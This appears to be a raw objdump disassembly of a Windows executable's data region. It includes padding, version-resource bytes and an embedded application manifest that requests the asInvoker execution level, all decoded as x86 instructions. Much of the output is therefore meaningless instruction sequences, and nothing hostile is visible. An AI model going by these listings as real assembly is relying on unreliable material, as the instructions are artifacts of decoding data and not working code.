  42ff89:	sub    dl,BYTE PTR [edi]
  42ff8b:	inc    eax
  42ff8c:	outs   dx,BYTE PTR ds:[esi]
  42ff8d:	es adc al,0xd
  42ff90:	outs   dx,BYTE PTR ds:[esi]
  42ff91:	es adc al,0x1
	...
  42ffa0:	(bad)  
  42ffa1:	inc    DWORD PTR [eax]
  42ffa3:	add    al,al
  42ffa5:	pop    es
  42ffa6:	add    BYTE PTR [eax],al
  42ffa8:	add    BYTE PTR [ebx],0x0
  42ffab:	add    BYTE PTR [eax+0x1],al
  42ffb1:	add    DWORD PTR [eax],eax
  42ffb3:	add    BYTE PTR [eax],al
  42ffb5:	add    DWORD PTR [eax],eax
  42ffb7:	add    BYTE PTR [eax],al
  42ffb9:	add    DWORD PTR [eax],eax
  42ffbb:	add    BYTE PTR [eax],al
  42ffbd:	add    DWORD PTR [eax],eax
  42ffbf:	add    BYTE PTR [eax],al
  42ffc1:	add    DWORD PTR [eax],eax
  42ffc3:	add    BYTE PTR [eax],al
  42ffc5:	add    DWORD PTR [eax],eax
  42ffc7:	add    BYTE PTR [eax],al
  42ffc9:	add    DWORD PTR [eax],eax
  42ffcb:	add    BYTE PTR [eax],al
  42ffcd:	add    DWORD PTR [eax],eax
  42ffcf:	add    BYTE PTR [eax-0x7fffffff],al
  42ffd5:	add    DWORD PTR [eax],eax
  42ffd7:	add    BYTE PTR [eax-0xffffffd],al
  42ffdd:	pop    es
  42ffde:	add    BYTE PTR [eax],al
  42ffe0:	sub    BYTE PTR [eax],al
  42ffe2:	add    BYTE PTR [eax],al
  42ffe4:	adc    BYTE PTR [eax],al
  42ffe6:	add    BYTE PTR [eax],al
  42ffe8:	and    BYTE PTR [eax],al
  42ffea:	add    BYTE PTR [eax],al
  42ffec:	add    DWORD PTR [eax],eax
  42ffee:	and    BYTE PTR [eax],al
  42fff0:	add    BYTE PTR [eax],al
  42fff2:	add    BYTE PTR [eax],al
  42fff4:	add    BYTE PTR [eax+eax*1],al
	...
  43004f:	add    BYTE PTR [esi+0x26],ch
  430052:	adc    al,0x3
  430054:	outs   dx,BYTE PTR ds:[esi]
  430055:	es adc al,0x13
  430058:	jl     0x430083
  43005a:	sbb    BYTE PTR [ebx+0x76],cl
  43005d:	ds sbb al,0xa1
  430060:	inc    si
  430062:	sbb    dl,ah
  430064:	mov    DWORD PTR [esi+0x28],ebx
  430067:	cmc    
  430068:	mov    eax,ds:0x90cb283c
  43006d:	xor    ah,BYTE PTR [ebx]
  43006f:	mov    DWORD PTR [ebp+0x28],esi
  430072:	push   ss
  430073:	dec    ebx
  430074:	outs   dx,BYTE PTR ds:[esi]
  430075:	es adc al,0x18
  430078:	outs   dx,BYTE PTR ds:[esi]
  430079:	es adc al,0x4
	...
  43008c:	outs   dx,BYTE PTR ds:[esi]
  43008d:	es adc al,0x4
  430090:	jae    0x4300b9
  430092:	adc    eax,0x23339b2f
  430097:	call   0x784a:0xff2a3caf
  43009e:	adc    bh,bh
  4300a0:	dec    eax
  4300a1:	mov    al,ds:0xbc3bff16
  4300a6:	sbb    bh,bh
  4300a8:	test   BYTE PTR [edx+esi*1+0x468bbcff],ah
  4300af:	inc    ecx
  4300b1:	test   BYTE PTR [ecx-0x3],cl
  4300b4:	cdq    
  4300b5:	inc    eax
  4300b6:	daa    
  4300b7:	lea    ebp,[esi+0x26]
  4300ba:	adc    al,0x35
  4300bc:	outs   dx,BYTE PTR ds:[esi]
  4300bd:	es adc al,0x7
	...
  4300cc:	jae    0x4300f5
  4300ce:	adc    eax,0x2332a52d
  4300d3:	mov    ecx,0xff2838af
  4300d8:	test   BYTE PTR [ebx+0x20],bl
  4300db:	inc    DWORD PTR [ebp-0x5b]
  4300de:	pop    ss
  4300df:	call   DWORD PTR [ecx-0x46]
  4300e2:	and    edi,edi
  4300e4:	inc    edx
  4300e5:	ret    
  4300e6:	push   ds
  4300e7:	inc    DWORD PTR [edi-0x39]
  4300ea:	push   ds
  4300eb:	jmp    FWORD PTR [eax-0x36]
  4300ee:	xor    edi,edi
  4300f0:	test   al,0x77
  4300f2:	aas    
  4300f3:	inc    esp
  4300f5:	ins    BYTE PTR es:[edi],dx
  4300f6:	inc    eax
  4300f7:	jmp    FWORD PTR [ecx+0x6ea4314f]
  4300fd:	es adc al,0x35
  430100:	outs   dx,BYTE PTR ds:[esi]
  430101:	es adc al,0x2
  430104:	add    BYTE PTR [eax],al
  430106:	add    BYTE PTR [eax],al
  430108:	outs   dx,BYTE PTR ds:[esi]
  430109:	es adc al,0xd
  43010c:	call   0x2838:0xb09e2030
  430113:	call   DWORD PTR [edx+0x2dff2857]
  430119:	cdq    
  43011a:	add    edi,edi
  43011c:	aaa    
  43011d:	mov    dh,0x3
  43011f:	call   DWORD PTR [edi+eax*8+0x23]
  430123:	jmp    DWORD PTR [esi-0x31]
  430126:	xor    edi,edi
  430128:	popa   
  430129:	iret   
  43012a:	xor    al,0xff
  43012c:	dec    esi
  43012d:	(bad)  
  43012e:	xor    al,0xff
  430130:	mov    ds:0xceff3a67,eax
  430135:	lahf   
  430136:	pop    ecx
  430137:	dec    ecx
  430139:	jo     0x430180
  43013b:	dec    DWORD PTR [ebp+0x6e822035]
  430141:	es adc al,0x18
  430144:	add    BYTE PTR [eax],al
  430146:	add    BYTE PTR [eax],al
  430148:	jle    0x430174
  43014a:	sbb    BYTE PTR [ecx-0x4b],cl
  43014d:	ss sub bh,bh
  430150:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430151:	cmp    eax,0xa34aff28
  430156:	and    bh,bh
  430158:	push   eax
  430159:	mov    edi,0xcc67ff0d
  43015e:	cmp    edi,edi
  430160:	push   0x6dff3dd1
  430165:	(bad)  [ebp-0x1]
  430168:	cdq    
  430169:	lods   eax,DWORD PTR ds:[esi]
  43016a:	pop    esp
  43016b:	inc    ebp
  43016d:	jno    0x4301b1
  43016f:	(bad)  
  430170:	mov    edi,0xd1ff4575
  430175:	xchg   ebx,eax
  430176:	push   esp
  430177:	call   edi
  430179:	stos   BYTE PTR es:[edi],al
  43017a:	pop    edi
  43017b:	inc    edx
  43017d:	addr16 inc ecx
  43017f:	lock jae 0x4301a9
  430182:	adc    eax,0x4a
  430187:	add    BYTE PTR [ecx-0x4e6ae1d0],dl
  43018d:	ss sub bh,bh
  430190:	stos   BYTE PTR es:[edi],al
  430191:	inc    esp
  430192:	sub    al,0xff
  430194:	stos   BYTE PTR es:[edi],al
  430195:	push   ecx
  430196:	xor    bh,bh
  430198:	push   ebx
  430199:	aam    0x37
  43019b:	jmp    DWORD PTR [ebp-0x26]
  43019e:	push   eax
  43019f:	(bad)  
  4301a0:	jnp    0x43017f
  4301a2:	imul   edi,edi,0xff60ac9c
  4301a8:	shr    BYTE PTR [ecx+0x42],0xff
  4301ac:	ret    0x3c5d
  4301af:	inc    ecx
  4301b1:	pop    edi
  4301b2:	cmp    edi,edi
  4301b4:	mov    edi,0xb1ff3f68
  4301b9:	jmp    FWORD PTR ds:[bp+0x3a60]
  4301bf:	dec    DWORD PTR [ecx+0x801d2d]
  4301c5:	add    BYTE PTR [eax],al
  4301c7:	add    BYTE PTR [edi+edx*2+0x18],dh
  4301cb:	out    0x91,al
  4301cd:	pusha  
  4301ce:	sub    eax,0x345cb1ff
  4301d3:	jmp    FWORD PTR [edx-0x5a00d2a6]
  4301d9:	pop    esp
  4301da:	sub    eax,0x2e5ba1ff
  4301df:	jmp    DWORD PTR [edi-0x4100ce9f]
  4301e5:	je     0x430222
  4301e7:	dec    edx
  4301e9:	jl     0x430231
  4301eb:	inc    esp
  4301ed:	imul   eax,DWORD PTR [edi+edi*8-0x47],0x5a
  4301f2:	cmp    bh,bh
  4301f4:	pop    ebx
  4301f5:	call   0xff2e:0x8e62ff25
  4301fc:	cdq    
  4301fd:	pop    esi
  4301fe:	xor    bh,bh
  430200:	pushf  
  430201:	xor    al,0x23
  430203:	mov    esi,0x0
  430208:	jne    0x43026d
  43020a:	push   ds
  43020b:	cli    
  43020c:	mov    ch,0x57
  43020e:	ss (bad) 
  430210:	mov    esi,0xd3ff2e69
  430215:	mov    WORD PTR [eax],?
  430217:	call   edi
  430219:	mov    ds:0xabdeff3a,al
  43021e:	aas    
  43021f:	jmp    eax
  430221:	scas   al,BYTE PTR es:[edi]
  430222:	aas    
  430223:	(bad)  
  430224:	fsub   QWORD PTR [ebp-0x6a2b00c1]
  43022a:	inc    ebp
  43022b:	dec    esp
  43022d:	or     DWORD PTR [edx-0x1],0xff4469c3
  430234:	and    dl,cl
  430236:	inc    edi
  430237:	call   DWORD PTR [esi]
  430239:	mov    edx,0x9137ff31
  43023e:	push   ss
  43023f:	jmp    FWORD PTR [ecx+0xe32a41]
  430245:	add    BYTE PTR [eax],al
  430247:	add    BYTE PTR [edx-0x5c1cd9a0],al
  43024d:	push   ebp
  43024e:	xor    bh,bh
  430250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430251:	pop    ebp
  430252:	jmp    DWORD PTR cs:[ebp-0x5700c599]
  430259:	outs   dx,DWORD PTR ds:[esi]
  43025a:	dec    ecx
  43025b:	(bad)  
  43025c:	mov    esi,0xf0ff7a94
  430261:	aam    0x5a
  430263:	(bad)  
  430264:	jmp    0xdf42502e
  430269:	scas   al,BYTE PTR es:[edi]
  43026a:	dec    eax
  43026b:	call   edx
  43026d:	xchg   ebp,eax
  43026e:	push   eax
  43026f:	inc    ebp
  430271:	jns    0x4302c0
  430273:	inc    DWORD PTR [ebx-0x14]
  430276:	mov    bh,bh
  430278:	xor    bl,bl
  43027a:	pop    edi
  43027b:	inc    DWORD PTR [ebx-0x69]
  43027e:	sub    al,0xff
  430280:	mov    ds:0xbe2b44,al
  430285:	add    BYTE PTR [eax],al
  430287:	add    BYTE PTR [eax+0x2e99214a],al
  43028d:	cdq    
  43028e:	add    bh,bh
  430290:	dec    esp
  430291:	test   al,0x1f
  430293:	jmp    FWORD PTR [ecx-0x32]
  430296:	aas    
  430297:	dec    DWORD PTR [ebp-0xe005f0f]
  43029d:	jmp    0xa50b0287
  4302a2:	mov    edi,edi
  4302a4:	jmp    0xe2426377
  4302a9:	mov    edx,0xa4d7ff52
  4302ae:	pop    ecx
  4302af:	inc    ebp
  4302b1:	adc    BYTE PTR [ecx-0x1],0x3c
  4302b5:	jecxz  0x430335
  4302b7:	(bad)  
  4302b8:	cmp    esp,esi
  4302ba:	je     0x4302bb
  4302bc:	jae    0x430241
  4302be:	xor    eax,0x1f348aff
  4302c3:	jge    0x4302c5
  4302c5:	add    BYTE PTR [eax],al
  4302c7:	add    BYTE PTR [ecx+esi*1+0x1c],bh
  4302cb:	inc    eax
  4302cc:	imul   eax,DWORD PTR [ebx-0x36a501d9],0x2b
  4302d3:	call   FWORD PTR [ebx-0x22]
  4302d6:	arpl   di,di
  4302d8:	(bad)
  4302db:	jmp    ecx
  4302dd:	(bad)  
  4302de:	idiv   bh
  4302e0:	jmp    0xe742dcc6
  4302e5:	fisttp QWORD PTR [ebx+0x5dc4e5ff]
  4302eb:	(bad)  
  4302ec:	fisubr DWORD PTR [edx-0x723300a0]
  4302f2:	pop    edx
  4302f3:	call   FWORD PTR [edi-0x17]
  4302f6:	mov    edi,edi
  4302f8:	inc    esp
  4302f9:	jmp    0x59d00282
  4302fe:	sub    esp,edi
  430300:	jno    0x430329
  430302:	adc    eax,0x44
  430307:	add    BYTE PTR [eax],al
  430309:	add    BYTE PTR [eax],al
  43030b:	add    BYTE PTR [edi+0x57903957],bl
  430311:	fwait
  430312:	sub    bh,bh
  430314:	xor    ch,dl
  430316:	cmp    bh,bh
  430318:	mov    edx,0xd7ffc8ec
  43031d:	sti    
  43031e:	icebp  
  43031f:	(bad)  
  430320:	fcmovnb st,st(5)
  430322:	mov    bh,0xff
  430324:	shl    BYTE PTR [eax-0x3f1e009c],cl
  43032a:	pusha  
  43032b:	(bad)  
  43032c:	fldcw  WORD PTR [ecx-0x7a38009d]
  430332:	push   esi
  430333:	jmp    DWORD PTR [esi-0x6c008b54]
  430339:	jns    0x430387
  43033b:	std    
  43033c:	sub    DWORD PTR [edi],0x266e761b
  430342:	adc    al,0x13
	...
  43034c:	leave  
  43034d:	jg     0x4303a2
  43034f:	add    DWORD PTR [ebx+0x66b24771],ebp
  430355:	mov    eax,ds:0xb97fff32
  43035a:	pusha  
  43035b:	jmp    FWORD PTR [edi-0x5f00885a]
  430361:	(bad)  
  430362:	mov    bh,bh
  430364:	les    ebx,FWORD PTR [eax-0x5f3200b0]
  43036a:	push   esp
  43036b:	call   ebp
  43036d:	mov    ds:0x7dc2ff61,al
  430372:	push   eax
  430373:	push   DWORD PTR [eax-0x6d02a678]
  430379:	xor    esp,DWORD PTR [ecx]
  43037b:	mov    ebp,DWORD PTR [esi+0x26]
  43037e:	adc    al,0x2e
  430380:	outs   dx,BYTE PTR ds:[esi]
  430381:	es adc al,0x2
	...
  43038c:	outs   dx,BYTE PTR ds:[esi]
  43038d:	es adc al,0x3
  430390:	out    0xc9,eax
  430392:	scas   eax,DWORD PTR es:[edi]
  430393:	add    ah,BYTE PTR [eax-0x6576be9b]
  430399:	mov    DWORD PTR [eax-0x7],ecx
  43039c:	sub    BYTE PTR [edx-0x427300a3],0x77
  4303a3:	push   DWORD PTR [ecx-0x3f00935b]
  4303a9:	mov    BYTE PTR [edi-0x1],cl
  4303ac:	into   
  4303ad:	xchg   ecx,eax
  4303ae:	pop    ebx
  4303af:	(bad)  
  4303b0:	mov    ebx,0x60e1456b
  4303b5:	test   DWORD PTR ds:0x14266eac,esi
  4303bb:	sub    ebp,DWORD PTR [esi+0x26]
  4303be:	adc    al,0x4
	...
  4303d8:	jg     0x430415
  4303da:	and    edi,DWORD PTR [edi]
  4303dc:	pushf  
  4303dd:	pop    esi
  4303de:	cmp    al,0x84
  4303e0:	mov    al,0x79
  4303e2:	dec    esp
  4303e3:	(bad)  
  4303e4:	mov    ah,0x7c
  4303e6:	dec    edi
  4303e7:	out    0xaa,eax
  4303e9:	imul   eax,DWORD PTR [ebx-0x40],0xffffff8e
  4303ed:	inc    esi
  4303ee:	sub    bh,BYTE PTR [edi+0x73]
  4303f1:	sub    dl,BYTE PTR [edi]
  4303f3:	inc    eax
  4303f4:	outs   dx,BYTE PTR ds:[esi]
  4303f5:	es adc al,0xd
  4303f8:	outs   dx,BYTE PTR ds:[esi]
  4303f9:	es adc al,0x1
	...
  430408:	(bad)  
  430409:	inc    DWORD PTR [eax]
  43040b:	add    al,al
  43040d:	pop    es
  43040e:	add    BYTE PTR [eax],al
  430410:	add    BYTE PTR [ebx],0x0
  430413:	add    BYTE PTR [eax+0x1],al
  430419:	add    DWORD PTR [eax],eax
  43041b:	add    BYTE PTR [eax],al
  43041d:	add    DWORD PTR [eax],eax
  43041f:	add    BYTE PTR [eax],al
  430421:	add    DWORD PTR [eax],eax
  430423:	add    BYTE PTR [eax],al
  430425:	add    DWORD PTR [eax],eax
  430427:	add    BYTE PTR [eax],al
  430429:	add    DWORD PTR [eax],eax
  43042b:	add    BYTE PTR [eax],al
  43042d:	add    DWORD PTR [eax],eax
  43042f:	add    BYTE PTR [eax],al
  430431:	add    DWORD PTR [eax],eax
  430433:	add    BYTE PTR [eax],al
  430435:	add    DWORD PTR [eax],eax
  430437:	add    BYTE PTR [eax-0x7fffffff],al
  43043d:	add    DWORD PTR [eax],eax
  43043f:	add    BYTE PTR [eax-0xffffffd],al
  430445:	pop    es
  430446:	add    BYTE PTR [eax],al
  430448:	add    BYTE PTR [eax],al
  43044a:	add    BYTE PTR [eax],al
  43044c:	adc    BYTE PTR [eax],al
  43044e:	add    BYTE PTR es:[esi+0x0],al
  430452:	imul   eax,DWORD PTR [eax],0x65006c
  430458:	add    BYTE PTR [eax],al
  43045a:	add    BYTE PTR [eax],0x69
  43045d:	add    BYTE PTR [ebp+0x0],al
  430460:	add    BYTE PTR es:[eax+0x0],bh
  430464:	imul   eax,DWORD PTR [eax],0x74
  43046a:	nop
  43046b:	add    BYTE PTR [esi],ah
  43046d:	add    BYTE PTR [eax+0x0],cl
  430470:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  430475:	add    BYTE PTR [eax],al
  430477:	add    BYTE PTR [eax+0x26006800],al
  43047d:	add    BYTE PTR [ecx+0x0],al
  430480:	bound  eax,QWORD PTR [eax]
  430482:	outs   dx,DWORD PTR ds:[esi]
  430483:	add    BYTE PTR [ebp+0x0],dh
  430486:	je     0x430488
  430488:	and    BYTE PTR [eax],al
  43048a:	add    BYTE PTR cs:[esi],ch
  43048d:	add    BYTE PTR [esi],ch
  43048f:	add    BYTE PTR [eax],al
  430491:	add    BYTE PTR [eax+0x41],dl
	...
  4304a0:	add    BYTE PTR [eax],al
  4304a2:	push   cs
  4304a3:	add    BYTE PTR [eax+eax*1+0x61],cl
  4304a7:	add    BYTE PTR [esi+0x0],ch
  4304aa:	add    BYTE PTR [di+0x0],dh
  4304ae:	popa   
  4304af:	add    BYTE PTR [edi+0x0],ah
  4304b2:	add    BYTE PTR gs:[eax],ah
  4304b5:	add    BYTE PTR [eax+0x0],dl
  4304b8:	popa   
  4304b9:	add    BYTE PTR [esi+0x0],ch
  4304bc:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
	...
  4304c9:	add    BYTE PTR [eax],dl
  4304cb:	add    BYTE PTR [eax+eax*1+0x61],cl
  4304cf:	add    BYTE PTR [esi+0x0],ch
  4304d2:	add    BYTE PTR [di+0x0],dh
  4304d6:	popa   
  4304d7:	add    BYTE PTR [edi+0x0],ah
  4304da:	add    BYTE PTR gs:[edi+0x0],dl
  4304de:	outs   dx,BYTE PTR ds:[esi]
  4304df:	add    BYTE PTR [eax+eax*1+0x43],ah
  4304e3:	add    BYTE PTR [eax+eax*1+0x61],ch
  4304e7:	add    BYTE PTR [ebx+0x0],dh
  4304ea:	jae    0x4304ec
  4304ec:	add    BYTE PTR [eax],al
  4304ee:	add    BYTE PTR [eax],al
  4304f0:	adc    BYTE PTR [eax],al
  4304f2:	aas    
  4304f3:	add    BYTE PTR [eax+0x0],ch
  4304f6:	add    BYTE PTR [eax],al
  4304f8:	nop
  4304f9:	add    BYTE PTR [edi],ch
  4304fb:	add    BYTE PTR [eax+0x0],ch
  4304fe:	add    BYTE PTR [eax],al
  430500:	add    BYTE PTR [eax],al
  430502:	add    DWORD PTR [eax],eax
  430504:	add    eax,0x0
  430509:	add    BYTE PTR [ecx],al
  43050b:	add    BYTE PTR [eax],ah
  43050d:	add    ah,dh
  43050f:	add    DWORD PTR ds:[eax],eax
  430512:	add    DWORD PTR [eax],eax
  430514:	xor    BYTE PTR [eax],dh
  430516:	add    BYTE PTR [eax],al
  430518:	add    DWORD PTR [eax],eax
  43051a:	and    BYTE PTR [eax],al
  43051c:	test   al,0x25
  43051e:	add    BYTE PTR [eax],al
  430520:	add    al,BYTE PTR [eax]
  430522:	and    BYTE PTR [eax],ah
  430524:	add    BYTE PTR [eax],al
  430526:	add    DWORD PTR [eax],eax
  430528:	and    BYTE PTR [eax],al
  43052a:	test   al,0x10
  43052c:	add    BYTE PTR [eax],al
  43052e:	add    eax,DWORD PTR [eax]
  430530:	sbb    BYTE PTR [eax],bl
  430532:	add    BYTE PTR [eax],al
  430534:	add    DWORD PTR [eax],eax
  430536:	and    BYTE PTR [eax],al
  430538:	mov    BYTE PTR [ecx],cl
  43053a:	add    BYTE PTR [eax],al
  43053c:	add    al,0x0
  43053e:	adc    BYTE PTR [eax],dl
  430540:	add    BYTE PTR [eax],al
  430542:	add    DWORD PTR [eax],eax
  430544:	and    BYTE PTR [eax],al
  430546:	push   0x5000004
  43054b:	add    BYTE PTR [eax],al
  43054d:	add    BYTE PTR [ecx],al
  43054f:	add    BYTE PTR [ecx],al
  430551:	add    BYTE PTR [eax],dl
  430553:	adc    BYTE PTR [eax],al
  430555:	add    BYTE PTR [ecx],al
  430557:	add    BYTE PTR [eax],ah
  430559:	add    BYTE PTR [eax+0x4],ch
  43055c:	add    BYTE PTR [eax],al
  43055e:	push   es
  43055f:	add    BYTE PTR [ecx+eiz*2],bh
  430562:	jae    0x4305d7
  430564:	gs ins DWORD PTR es:[edi],dx
  430566:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  43056a:	js     0x4305d9
  43056c:	ins    BYTE PTR es:[edi],dx
  43056d:	outs   dx,BYTE PTR ds:[esi]
  43056e:	jae    0x4305ad
  430570:	and    dh,BYTE PTR [ebp+0x72]
  430573:	outs   dx,BYTE PTR ds:[esi]
  430574:	cmp    dh,BYTE PTR [ebx+0x63]
  430577:	push   0x73616d65
  43057c:	sub    eax,0x7263696d
  430581:	outs   dx,DWORD PTR ds:[esi]
  430582:	jae    0x4305f3
  430584:	data16 je 0x4305b4
  430587:	arpl   WORD PTR [edi+0x6d],bp
  43058a:	cmp    ah,BYTE PTR [ecx+0x73]
  43058d:	ins    DWORD PTR es:[edi],dx
  43058e:	cs jbe 0x4305c2
  430591:	and    ah,BYTE PTR [eax]
  430593:	ins    DWORD PTR es:[edi],dx
  430594:	popa   
  430595:	outs   dx,BYTE PTR ds:[esi]
  430596:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  43059d:	jb     0x430612
  43059f:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4305a6:	xor    BYTE PTR [edx],ah
  4305a8:	ds cmp al,0x61
  4305ab:	jae    0x430620
  4305ad:	gs ins DWORD PTR es:[edi],dx
  4305af:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4305b3:	fs outs dx,BYTE PTR gs:[esi]
  4305b6:	je     0x430621
  4305b8:	je     0x430633
  4305ba:	and    BYTE PTR [esi+0x65],dh
  4305bd:	jb     0x430632
  4305bf:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4305c6:	xor    BYTE PTR [esi],ch
  4305c8:	xor    BYTE PTR [esi],ch
  4305ca:	xor    BYTE PTR [edx],ah
  4305cc:	and    BYTE PTR [eax+0x72],dh
  4305cf:	outs   dx,DWORD PTR ds:[esi]
  4305d0:	arpl   WORD PTR [ebp+0x73],sp
  4305d3:	jae    0x430644
  4305d5:	jb     0x430618
  4305d7:	jb     0x43063c
  4305d9:	push   0x63657469
  4305de:	je     0x430655
  4305e0:	jb     0x430647
  4305e2:	cmp    eax,0x36387822
  4305e7:	and    ah,BYTE PTR [eax]
  4305e9:	outs   dx,BYTE PTR ds:[esi]
  4305ea:	popa   
  4305eb:	ins    DWORD PTR es:[edi],dx
  4305ec:	gs cmp eax,0x676f4422
  4305f2:	ins    BYTE PTR es:[edi],dx
  4305f3:	imul   ebp,DWORD PTR [ebx+0x65],0x20223637
  4305fa:	je     0x430675
  4305fc:	jo     0x430663
  4305fe:	cmp    eax,0x6e697722
  430603:	xor    esi,DWORD PTR [edx]
  430605:	and    bh,BYTE PTR [esi]
  430607:	cmp    al,0x2f
  430609:	popa   
  43060a:	jae    0x43067f
  43060c:	gs ins DWORD PTR es:[edi],dx
  43060e:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  430612:	fs outs dx,BYTE PTR gs:[esi]
  430615:	je     0x430680
  430617:	je     0x430692
  430619:	ds cmp al,0x64
  43061c:	gs jae 0x430682
  43061f:	jb     0x43068a
  430621:	jo     0x430697
  430623:	imul   ebp,DWORD PTR [edi+0x6e],0x6e614c3e
  43062a:	addr16 jne 0x43068e
  43062d:	addr16 gs cmp al,0x2f
  430631:	fs gs jae 0x430698
  430635:	jb     0x4306a0
  430637:	jo     0x4306ad
  430639:	imul   ebp,DWORD PTR [edi+0x6e],0x65643c3e
  430640:	jo     0x4306a7
  430642:	outs   dx,BYTE PTR ds:[esi]
  430643:	fs outs dx,BYTE PTR gs:[esi]
  430646:	arpl   WORD PTR [ecx+0x3e],di
  430649:	cmp    al,0x64
  43064b:	gs jo  0x4306b3
  43064e:	outs   dx,BYTE PTR ds:[esi]
  43064f:	fs outs dx,BYTE PTR gs:[esi]
  430652:	je     0x430695
  430654:	jae    0x4306c9
  430656:	gs ins DWORD PTR es:[edi],dx
  430658:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  43065c:	cmp    al,0x61
  43065e:	jae    0x4306d3
  430660:	gs ins DWORD PTR es:[edi],dx
  430662:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  430666:	fs outs dx,BYTE PTR gs:[esi]
  430669:	je     0x4306d4
  43066b:	je     0x4306e6
  43066d:	and    BYTE PTR [ecx+edi*2+0x70],dh
  430671:	gs cmp eax,0x6e697722
  430677:	xor    esi,DWORD PTR [edx]
  430679:	and    ah,BYTE PTR [eax]
  43067b:	outs   dx,BYTE PTR ds:[esi]
  43067c:	popa   
  43067d:	ins    DWORD PTR es:[edi],dx
  43067e:	gs cmp eax,0x63694d22
  430684:	jb     0x4306f5
  430686:	jae    0x4306f7
  430688:	data16 je 0x4306b9
  43068b:	push   edi
  43068c:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  430693:	inc    ebx
  430694:	outs   dx,DWORD PTR ds:[esi]
  430695:	ins    DWORD PTR es:[edi],dx
  430696:	ins    DWORD PTR es:[edi],dx
  430697:	outs   dx,DWORD PTR ds:[esi]
  430698:	outs   dx,BYTE PTR ds:[esi]
  430699:	sub    eax,0x746e6f43
  43069e:	jb     0x43070f
  4306a0:	ins    BYTE PTR es:[edi],dx
  4306a1:	jae    0x4306c5
  4306a3:	and    BYTE PTR [esi+0x65],dh
  4306a6:	jb     0x43071b
  4306a8:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  4306af:	xor    BYTE PTR [esi],ch
  4306b1:	xor    BYTE PTR [esi],ch
  4306b3:	xor    BYTE PTR [edx],ah
  4306b5:	and    BYTE PTR [eax+0x72],dh
  4306b8:	outs   dx,DWORD PTR ds:[esi]
  4306b9:	arpl   WORD PTR [ebp+0x73],sp
  4306bc:	jae    0x43072d
  4306be:	jb     0x430701
  4306c0:	jb     0x430725
  4306c2:	push   0x63657469
  4306c7:	je     0x43073e
  4306c9:	jb     0x430730
  4306cb:	cmp    eax,0x36385822
  4306d0:	and    ah,BYTE PTR [eax]
  4306d2:	jo     0x430749
  4306d4:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4306d8:	dec    ebx
  4306d9:	gs jns 0x430730
  4306dc:	outs   dx,DWORD PTR ds:[esi]
  4306dd:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4306e1:	and    dh,BYTE PTR [esi]
  4306e3:	xor    eax,0x36623539
  4306e8:	xor    al,0x31
  4306ea:	xor    al,0x34
  4306ec:	arpl   WORD PTR [ebx+0x66],sp
  4306ef:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  4306f3:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  4306f7:	addr16 jne 0x43075b
  4306fa:	addr16 gs cmp eax,0x3e222a22
  430701:	cmp    al,0x2f
  430703:	popa   
  430704:	jae    0x430779
  430706:	gs ins DWORD PTR es:[edi],dx
  430708:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  43070c:	fs outs dx,BYTE PTR gs:[esi]
  43070f:	je     0x43077a
  430711:	je     0x43078c
  430713:	ds cmp al,0x2f
  430716:	fs gs jo 0x43077f
  43071a:	outs   dx,BYTE PTR ds:[esi]
  43071b:	fs outs dx,BYTE PTR gs:[esi]
  43071e:	je     0x430761
  430720:	jae    0x430795
  430722:	gs ins DWORD PTR es:[edi],dx
  430724:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  430728:	cmp    al,0x2f
  43072a:	fs gs jo 0x430793
  43072e:	outs   dx,BYTE PTR ds:[esi]
  43072f:	fs outs dx,BYTE PTR gs:[esi]
  430732:	arpl   WORD PTR [ecx+0x3e],di
  430735:	cmp    al,0x74
  430737:	jb     0x4307ae
  430739:	jae    0x4307af
  43073b:	dec    ecx
  43073c:	outs   dx,BYTE PTR ds:[esi]
  43073d:	outs   dx,WORD PTR ds:[esi]
  43073f:	and    BYTE PTR [eax+0x6d],bh
  430742:	ins    BYTE PTR es:[edi],dx
  430743:	outs   dx,BYTE PTR ds:[esi]
  430744:	jae    0x430783
  430746:	and    dh,BYTE PTR [ebp+0x72]
  430749:	outs   dx,BYTE PTR ds:[esi]
  43074a:	cmp    dh,BYTE PTR [ebx+0x63]
  43074d:	push   0x73616d65
  430752:	sub    eax,0x7263696d
  430757:	outs   dx,DWORD PTR ds:[esi]
  430758:	jae    0x4307c9
  43075a:	data16 je 0x43078a
  43075d:	arpl   WORD PTR [edi+0x6d],bp
  430760:	cmp    ah,BYTE PTR [ecx+0x73]
  430763:	ins    DWORD PTR es:[edi],dx
  430764:	cs jbe 0x43079a
  430767:	and    bh,BYTE PTR [esi]
  430769:	cmp    al,0x73
  43076b:	arpl   WORD PTR gs:[ebp+0x72],si
  43076f:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x7165723c
  430777:	jne    0x4307de
  430779:	jae    0x4307ef
  43077b:	gs fs push eax
  43077e:	jb     0x4307e9
  430780:	jbe    0x4307eb
  430782:	ins    BYTE PTR es:[edi],dx
  430783:	gs addr16 gs jae 0x4307c6
  430788:	cmp    al,0x72
  43078a:	gs jno 0x430802
  43078d:	gs jae 0x430804
  430790:	gs fs inc ebp
  430793:	js     0x4307fa
  430795:	arpl   WORD PTR [ebp+0x74],si
  430798:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  43079f:	ins    BYTE PTR es:[edi],dx
  4307a0:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4307a4:	gs ins BYTE PTR es:[edi],dx
  4307a6:	cmp    eax,0x49736122
  4307ab:	outs   dx,BYTE PTR ds:[esi]
  4307ac:	jbe    0x43081d
  4307ae:	imul   esp,DWORD PTR [ebp+0x72],0x22
